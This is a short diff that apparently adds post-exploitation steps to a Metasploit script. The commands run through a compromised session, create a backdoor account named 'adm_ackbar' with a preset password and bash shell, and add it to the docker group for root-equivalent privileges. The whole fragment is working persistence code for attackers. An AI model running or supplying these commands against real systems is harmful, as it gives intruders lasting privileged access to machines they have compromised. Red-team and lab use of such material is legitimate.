@@ -1,0 +1,3 @@
+sessions -i $SESSION -c 'useradd -g users -s /bin/bash -p $(echo itsatrap | openssl passwd -1 -stdin) adm_ackbar'
+sessions -i $SESSION -c 'usermod -a -G docker adm_ackbar'
+
